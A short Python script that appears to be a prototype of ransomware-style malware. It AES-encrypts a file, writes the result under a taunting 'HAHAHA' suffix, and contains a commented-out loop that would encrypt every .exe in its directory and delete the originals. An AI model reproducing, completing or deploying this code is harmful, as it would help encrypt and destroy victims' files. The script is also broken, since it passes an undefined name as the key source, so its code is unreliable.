import os
import base64
import sys
from io import BytesIO
from Crypto import Random
from Crypto.Cipher import AES

THIS_DIR = os.path.dirname(os.path.realpath(__file__))

def encrypt(data, filename):
    with open(filename, "rb") as source:
        key = source.read(24)

    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CFB, iv)
    encrypted = iv + cipher.encrypt(data)

    return base64.b64encode(encrypted)

if __name__ == "__main__":
	for (dirpath, dirnames, filenames) in os.walk(THIS_DIR):
		break

	with open("test.py", "rb") as f:
		data = f.read()
		destination = "test.pyHAHAHA"
		with open(destination, "wb") as fd:
			fd.write(encrypt(data, file))
			fd.close()

	# for file in filenames:
	# 	if file.endswith(".exe"):
	# 		with open(file, "rb") as f:
	# 			data = f.read()
	# 		# os.remove(file)

	# 		destination = file + "HAHAHA"
	# 		with open(destination, "wb") as fd:
	# 			fd.write(encrypt(data, file))
	# 			fd.close()